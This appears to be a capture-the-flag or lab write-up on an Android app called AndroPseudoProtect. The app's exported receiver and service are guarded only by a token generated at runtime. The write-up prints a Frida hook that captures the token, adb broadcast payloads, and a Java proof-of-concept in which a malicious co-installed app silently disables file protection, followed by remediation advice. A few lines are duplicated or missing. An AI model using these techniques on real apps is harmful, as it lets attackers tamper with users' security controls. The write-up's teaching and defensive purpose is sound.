## 1. Executive Summary

AndroPseudoProtect is a "device security" app that encrypts the user's files (Start Security) and decrypts them back (Stop Security). Both security operations are dispatched through an exported `BroadcastReceiver` that forwards an `Intent` to an exported `SecurityService`. Although the service validates a secret token before acting, the token is generated by a native method at runtime and is observable via runtime instrumentation.

By combining static analysis (JADX) with dynamic analysis (Frida), the token was captured at runtime and the identical request was replayed from outside the application — successfully toggling the device's "security" state without any user interaction. The same attack works from any co-installed application, with no ADB and no privileges required.

**Root cause:** security decisions delegated to exported IPC components that authenticate callers with an observable secret instead of verifying the caller's identity.

---

## 2. Application Overview

| UI Element | Apparent Function |
|---|---|
| **Start Security** | Encrypts the user's files |
| **Stop Security** | Decrypts them back |

The user sees a simple protection switch. The real question is: *who actually executes the request, and who is allowed to send it?*

---

## 3. Methodology — Mind Mapping Before Hooking

Instead of jumping straight to tools, the application's control flow was mapped after decompiling it in JADX:

```
Button → Intent → SecurityReceiver → SecurityService → Encrypt/Decrypt
```

The mapping questions that drove the analysis:

- Who talks to whom?
- Where is the security decision point?
- What input controls the security behavior?
- Where does the secret come from?

This exposed the weak link (the IPC boundary) before any exploit was written — the hook then became a pure execution step, not a discovery step.

## 4. Static Analysis (JADX)

```bash
jadx -d jadx_out AndroPseudoProtect.apk
adb shell dumpsys package com.eightksec.andropseudoprotect | grep -B2 -A8 "exported=true"
```

### 4.1 Manifest Findings

`[Screenshot placeholder: JADX — AndroidManifest.xml showing exported components]`

```xml
<receiver android:name=".SecurityReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.eightksec.andropseudoprotect.START_SECURITY"/>
        <action android:name="com.eightksec.andropseudoprotect.STOP_SECURITY"/>
    </intent-filter>
</receiver>

<service android:name=".SecurityService" android:exported="true"/>
```

`android:exported="true"` on **both** components means any application on the device — or ADB itself — can deliver the same intents. Not just the app's own UI.

### 4.2 Code Flow Findings

1. The buttons execute nothing themselves — they send an `Intent` to `SecurityReceiver`, which forwards it to `SecurityService` where the encryption logic lives.
2. The service does not blindly accept requests: it expects a secret **token** in the intent extra `security_token`.
3. Tracing the token's origin led to `SecurityUtils.getSecurityToken()` — a **native method** (JNI). The token is not hardcoded, not stored in a file, and not fetched from a server. Static analysis cannot reveal its value — but it reveals exactly *where it is produced*.

### 4.3 Attack Blueprint (collected via static analysis)

| Information | Value |
|---|---|
| Package name | `com.eightksec.andropseudoprotect` |
| Receiver | `.SecurityReceiver` |
| Service | `.SecurityService` |
| Action (stop) | `com.eightksec.andropseudoprotect.STOP_SECURITY` |
| Action (start) | `com.eightksec.andropseudoprotect.START_SECURITY` |
| Extra key | `security_token` |
| Token generator | `com.eightksec.andropseudoprotect.SecurityUtils.getSecurityToken()` (native) |

## 5. Dynamic Analysis — Extracting the Token with Frida

Rather than reversing the native library, the app itself was made to produce the token while a hook logged it in transit.

### 5.1 Environment Setup

```bash
# Terminal 1 — server on the device (device architecture: x86_64 VMware VM)
adb shell getprop ro.product.cpu.abi
wget https://github.com/frida/frida/releases/download/17.11.0/frida-server-17.11.0-android-x86_64.xz
xz -d frida-server-17.11.0-android-x86_64.xz
adb push frida-server-17.11.0-android-x86_64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell
cd /data/local/tmp && ./frida-server        # keep this terminal open

# Terminal 2 — client on the host
frida-ps -U                                  # must list processes before proceeding
```

### 5.2 The Hook — `hook_token.js`

```javascript
Java.perform(function () {
    var SecurityUtils = Java.use("com.eightksec.andropseudoprotect.SecurityUtils");

    SecurityUtils.getSecurityToken.implementation = function () {
        var t = this.getSecurityToken();   // call the original native implementation
        console.log("[+] TOKEN => " + t);
        return t;
    };

    console.log("[*] Hook installed on SecurityUtils.getSecurityToken()");
});
```

### 5.3 Token Capture

```bash
frida -U -f com.eightksec.andropseudoprotect -l hook_token.js
```

Pressing **Start Security** in the app triggers the token generation:

```
[*] Hook installed on SecurityUtils.getSecurityToken()
[+] TOKEN => 8ksec_S3cr3tT0k3n_D0N0tSh4r3
```

## 6. Exploitation — Intent Injection

With the full blueprint (static) plus the live token (dynamic), the app's internal message was crafted from the outside. Since the intent-filter lives on a `BroadcastReceiver`, a broadcast is the correct delivery mechanism:

### Primary Payload — Stop Security 🏁

```bash
adb shell am broadcast \
  -n com.eightksec.andropseudoprotect/.SecurityReceiver \
  -a com.eightksec.andropseudoprotect.STOP_SECURITY \
  --es security_token 8ksec_S3cr3tT0k3n_D0N0tSh4r3
```

`[Screenshot placeholder: adb output + app state after the broadcast]`

### Secondary Payloads

```bash
# Enable security externally (full control proof)
adb shell am broadcast \
  -n com.eightksec.andropseudoprotect/.SecurityReceiver \
  -a com.eightksec.andropseudoprotect.START_SECURITY \
  --es security_token 8ksec_S3cr3tT0k3n_D0N0tSh4r3

  --es security_token 8ksec_S3cr3tT0k3n_D0N0tSh4r3
```

### 6.1 Execution Evidence

- `logcat` confirms the full chain fired — the receiver forwarded to the service, which invoked the native token validator:

## 7. Proof of Concept — No ADB Required

The realistic attack does not need a cable: any co-installed application that understands the protocol performs the identical logic in the background.

```java
public void attack(View v) {
    Intent i = new Intent("com.eightksec.andropseudoprotect.STOP_SECURITY");
    i.setClassName("com.eightksec.andropseudoprotect",
                   "com.eightksec.andropseudoprotect.SecurityReceiver");
    i.putExtra("security_token", "8ksec_S3cr3tT0k3n_D0N0tSh4r3");
    sendBroadcast(i);
}
```

The user presses *Start Security*, sees the confirmation toast, and trusts the protection — while a malicious app silently disables it. From the victim's perspective: correct action, correct structure, correct token → it executes.

## 9. Risk Assessment

**Severity: High** — CVSS:3.1 `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (7.8)

- **Confidentiality/Integrity/Availability of user files:** a zero-permission, co-installed app can silently disable the file-protection mechanism (decrypting what the user believes is protected), or re-enable encryption at will.
- **No user interaction, no permissions, no privileges required** by the attacking app.
- The token is not an authentication boundary: it is observable at runtime on the same device and identical across runs of this build.

## 10. Remediation Recommendations

1. **Do not export sensitive components** — the receiver and service need no external callers:
   ```xml
   <receiver android:name=".SecurityReceiver" android:exported="false"/>
   ```
2. If external access is truly required, enforce **caller identity**, not a shared secret:
   ```xml
   <receiver android:name=".SecurityReceiver"
             android:exported="true"
             android:permission="com.eightksec.permission.SECURITY_CONTROL"/>
   ```
   plus a signature-level custom permission, and validate `Binder.getCallingUid()` inside the service.
3. **An obscurity token is not authentication** — a runtime-generated value is trivially observable via instrumentation (Frida) or a hooked peer app. Bind authorization to caller identity/signature.
4. **Design IPC assuming a hostile sender** — any component reachable from outside must treat every request as untrusted.

---

## 11. Conclusion

A structured mind map of the application's IPC flow exposed the vulnerability before any tooling was used: buttons delegate to an exported receiver, which forwards to an exported service, guarded only by a runtime-generated token. Static analysis provided the complete blueprint (package, components, actions, extra key, token source); a single Frida hook supplied the missing runtime value; and the identical request was then replayed from outside — first via ADB, then via a minimal malicious app. The lesson matches the challenge title: *think before you hook* — understanding the architecture turned exploitation into a two-step engineering task.
